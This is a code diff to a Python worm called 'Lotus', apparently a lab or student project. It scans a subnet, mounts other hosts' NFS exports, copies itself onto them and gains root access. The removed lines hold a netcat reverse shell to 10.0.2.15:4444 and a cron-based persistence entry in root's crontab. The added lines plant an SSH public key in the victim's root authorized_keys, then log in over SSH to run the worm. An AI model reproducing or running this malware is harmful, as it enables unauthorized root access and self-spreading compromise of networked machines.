@@ -5,8 +5,9 @@ import subprocess
 from subprocess import Popen, PIPE
 import base64
 from os import path
-ssh_command = "nc -nv 10.0.2.15 4444 -e /bin/bash"                               ## Add command and control server info here, as well as running the worm itself.
-cron = "'* * * * * /Lotus/Lotus.py'"
+import time
+ssh_command = "/Lotus/Lotus.py; exit"                               ## Add command and control server info here, as well as running the worm itself.
+#cron = "* * * * * /Lotus/Lotus.py \n"
 
 def subnet():                                                                     #This runs first
     global h_ip                                                                   #Set a global variable to contain the host machine ip for use in check 3
@@ -67,11 +68,15 @@ def worm():
             print('Starting Worm . . .')
             os.makedirs('/tmp/r00t', exist_ok = True)
             subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
-            subprocess.run(['cp', '-r', '/Lotus', '/tmp/r00t'])
-            print('Copying complete, adding cronjob')
-            subprocess.run(["export EDITOR='vim'"], shell = True)
-            subprocess.run(["echo " + cron + " >> /tmp/r00t/var/spool/cron/crontabs/root"], shell=True)
+            subprocess.call(['cp', '-r', '/Lotus', '/tmp/r00t'])
+            print('Copying complete, attempting ssh')
+            subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
+            proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
+            proc.communicate(input=base64.encodebytes('y'.encode()))
+            proc.communicate()
+            subprocess.call(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
             subprocess.run(['umount /tmp/r00t'], shell=True)
+            subprocess.run(['ssh', '-t', 'root@'  + str(ip), ssh_command])
             print('Complete!')
     except:
         pass
